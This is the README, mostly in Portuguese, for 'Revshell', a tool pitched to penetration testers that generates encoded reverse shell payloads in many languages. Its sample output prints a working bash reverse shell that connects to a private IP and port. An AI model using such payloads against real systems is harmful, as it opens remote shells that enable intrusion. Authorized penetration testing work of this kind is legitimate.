<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>

[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=Revshell)](https://git.io/typing-svg)



<h4 align="center">Tool that generates reverse shell in multiple languages and encodes </h4>


<p align="center">
  <a href="#características">Features</a> •
  <a href="#instalação">Install</a> •
  <a href="#forma-de-utilização">How to use</a> •
  <a href="#executando-revshell">Usage</a>
</p>

---


O Revshell é uma ferramenta que gera payloads de reverse shell de várias linguagens como python, bash, perl, powershell e muit outros. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. Revshell é construído para fazer apenas uma coisa - gera payloads reverse shell + encodes e faz isso muito bem.

Projetei o `Revshell` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.

# Características

 - Gera payloads de reverse shell para diversas linguagens de programação (python, bash, powershell e etc)
 - Funcionalidade de realizar encode das payloads desejadas (Url encode, base64, hexadecimal e etc)

# Forma de utilização

```sh
python3 Revshell.py -ip 192.168.4.80 -port 4444 -payload bash -encode urlencode
python3 Revshell.py -ip 192.168.4.80 -port 4444 -payload bash 
python3 Revshell.py -ip 192.168.4.80 -port 4444 -payload python
python3 Revshell.py -ip 192.168.4.80 -port 4444 -payload perl -encode base64
```
Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
```yaml
    ____                     __           __ __
   / __ \ ___  _   __ _____ / /_   ___   / // /
  / /_/ // _ \| | / // ___// __ \ / _ \ / // / 
 / _, _//  __/| |/ /(__  )/ / / //  __// // /  
/_/ |_| \___/ |___//____//_/ /_/ \___//_//_/   
                                               
                                   v1.6

options:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  -ip IP                Insert ip
  -port PORTA           Insert port
  -payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
  -encode {base64,hex,urlencode} Insert encode
```

# Instalação

Revshell requer **python3** e para baixá-lo só usar:

```sh
git clone https://github.com/joaoviictorti/Revshell
```

# Executando Revshell

```console
python3 Revshell.py -ip 192.168.4.160 -port 8080 -payload bash

    ____                     __           __ __
   / __ \ ___  _   __ _____ / /_   ___   / // /
  / /_/ // _ \| | / // ___// __ \ / _ \ / // / 
 / _, _//  __/| |/ /(__  )/ / / //  __// // /  
/_/ |_| \___/ |___//____//_/ /_/ \___//_//_/   
                                               

bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
```


<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
